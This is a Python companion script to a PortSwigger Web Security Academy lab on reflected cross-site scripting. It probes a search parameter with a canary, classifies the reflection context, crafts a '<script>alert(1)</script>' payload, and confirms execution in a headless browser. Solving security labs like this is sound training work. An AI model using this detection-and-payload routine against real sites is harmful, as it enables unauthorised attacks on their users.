#!/usr/bin/env python3
"""
Reflected XSS into HTML context with nothing encoded
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 01-reflected-xss-html-context-nothing-encoded.md

What this does:
    Injects a canary into the `search` parameter, confirms it reflects between
    HTML tags with no encoding applied, then delivers the standard <script>
    payload and confirms execution with a headless browser listening for the
    alert() dialog (a plain HTTP client can't observe JS execution).

Usage:
    python 01-reflected-xss-html-context-nothing-encoded.py <lab-url>
    e.g. python 01-reflected-xss-html-context-nothing-encoded.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

CANARY = "xssCANARY7531"


def classify_and_craft(client: httpx.Client, lab_url: str) -> str:
    """Reproduces detect_reflected_xss() + craft_xss_payload()'s html-context branch."""
    r = client.get(lab_url, params={"search": CANARY})
    if CANARY not in r.text:
        raise RuntimeError("canary not reflected in 'search' parameter")

    # Context classification: not inside <script>, not inside href=, not inside
    # a tag attribute -- landing plainly between two HTML tags.
    if re.search(rf"<script[^>]*>[^<]*{CANARY}", r.text, re.IGNORECASE | re.DOTALL):
        context = "js_string"
    elif re.search(rf'href="[^"]*{CANARY}', r.text, re.IGNORECASE):
        context = "href"
    elif re.search(rf"<[^>]+{CANARY}", r.text, re.IGNORECASE):
        context = "attribute"
    else:
        context = "html"
    print(f"[+] Context classified as: {context}")

    angle_encoded = False
    r = client.get(lab_url, params={"search": f"{CANARY}<>"})
    if "&lt;" in r.text or "&gt;" in r.text:
        angle_encoded = True
        print("[*] Angle brackets are HTML-encoded")
    else:
        print("[*] Angle brackets are NOT encoded -- new tags can be injected")

    if context == "html":
        payload = '" onmouseover="alert(1)' if angle_encoded else "<script>alert(1)</script>"
    else:
        raise RuntimeError(f"unexpected context for this lab: {context}")

    return payload


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")  # warm up, grab session cookie
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    payload = classify_and_craft(client, lab_url)
    print(f"[*] Crafted payload: {payload}")

    url = f"{lab_url}/?search={urllib.parse.quote(payload)}"

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'}")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
